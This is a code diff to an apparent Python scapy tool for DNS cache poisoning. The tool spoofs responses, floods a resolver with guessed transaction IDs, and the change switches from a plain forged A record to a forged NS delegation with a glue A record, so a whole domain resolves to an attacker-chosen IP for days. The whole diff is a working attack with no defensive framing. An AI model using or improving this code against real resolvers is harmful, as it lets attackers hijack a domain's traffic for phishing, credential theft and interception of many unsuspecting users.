@@ -1,6 +1,7 @@
 import sys
 import scapy.all as scapy
 from concurrent.futures import ThreadPoolExecutor
+import tldextract
 
 # Get list of network interfaces available on the system
 ip = scapy.get_if_list()
@@ -77,6 +78,15 @@ def handle_dns_response(txid, query, hijack_ip, src_ip, src_port, dst_ip, dst_po
     # Send multiple forged DNS packets to increase chances of winning the race condition
     for _ in range(10):  # Increase this number to flood the resolver with guesses
         send_packet(src_ip=dst_ip, dst_ip=src_ip, dst_port=src_port, payload=forged_payload)
+        
+        
+def extract_domain(query):
+    extracted = tldextract.extract(query)
+    domain = f"{extracted.domain}.{extracted.suffix}"
+    print(domain)
+    return domain
+    
+    
 
 
 # Function to generate a forged DNS payload (response)
@@ -85,6 +95,8 @@ def dns_payload(txid, query, hijack_ip):
     Creates a forged DNS response payload that includes the original TxID and query, 
     but returns a forged IP (hijack_ip) for the domain.
     """
+    
+    domain_to_poision = extract_domain(query)
 
     payload = scapy.DNS(
         id=txid,  # Set the TxID to match the one from the query
@@ -100,8 +112,12 @@ def dns_payload(txid, query, hijack_ip):
     # Add the original query in the Question Section
     payload.qd = scapy.DNSQR(qname=query, qtype="A", qclass="IN")
 
-    # Add the Answer Section (A record for the forged domain)
-    payload.an = scapy.DNSRR(rrname=query, type="A", rdata=hijack_ip, ttl=1)
+    # Add the Authority Section (NS record for the forged domain)
+    
+    payload.ns = scapy.DNSRR(rrname=query, type="NS", rdata=f"ns1.{domain_to_poision }", ttl=84600)
+    
+    # Add the Additional Section (A record pointing ns1.example.com to the hijacked IP)
+    payload.ar = scapy.DNSRR(rrname=f"ns1.{domain_to_poision }", type="A", ttl=604800, rdata=hijack_ip)
 
     return payload
 
